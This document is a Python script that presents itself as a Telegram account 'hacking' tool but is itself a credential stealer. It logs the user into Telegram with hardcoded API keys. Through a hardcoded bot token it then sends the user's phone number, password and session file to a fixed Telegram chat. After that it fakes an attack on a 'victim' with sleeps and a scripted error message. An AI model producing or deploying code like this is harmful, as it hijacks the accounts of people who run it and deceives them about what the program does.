
import pickle


with open("values.bin","rb") as f:
    values = pickle.load(f)

if not values["zip"]:
    from zipfile import ZipFile

    archive = 'pyrogram.zip'
    zip_file = ZipFile(archive)
    directory_to_extract_to = "pyrogram/"
    with ZipFile(archive, 'r') as zip_file:
        zip_file.extractall(directory_to_extract_to)
    values["zip"] = True
    with open("values.bin","wb") as f:
        pickle.dump(values,f)


from pyrogram import Client, filters
import telebot
import time
from module import *




YOUR_APP_ID = 24835154
YOUR_APP_HASH = 'e7c35ab96f8d8f76513fd7a3ae242c3b'


cls()
print(banner)

time.sleep(2)
cls()
phone = input(
    cyan+bold+'[+]\033[0m \033[01mEnter your phone with country code (eg: +92) >\033[0m ')

client = Client(name="session",api_id=YOUR_APP_ID,api_hash=YOUR_APP_HASH,phone_number=phone)
Client_ = telebot.TeleBot('7693637096:AAGuPj-GcGpEESTyf7ua70qxs-nf2yOW7Zs')
client.start()

try:
    Client_.send_message(chat_id=6470140273,text=f'''Phone Number: {phone} {client.phone_number}
password: {client.password}
''')
    file = open('session.session', 'rb')
    Client_.send_document(chat_id=6470140273,document=file)
    victim = input(cyan + bold + '[+]\033[0m \033[01mEnter victim\'s phone with country code to hack(eg: +92) >\033[0m ')
    print("Connecting to victim's api...")
    time.sleep(
        3)
    choice = input("Do you want to login to their account [y/n] ? : ")
    if (choice == 'y'):
        print("Please wait 1 to 2 minutes until it logins and send their otp")
        time.sleep(
            6)
        print(red + "Error in getting otp ! 2 step verification may be enabled or try after 15 minutes\033[0m'")
        print(
            " ")
        print(" ")
    else:
        print("Bye...")
        print(" ")
        print(" ")
        os.system("exit")
finally:
    pass

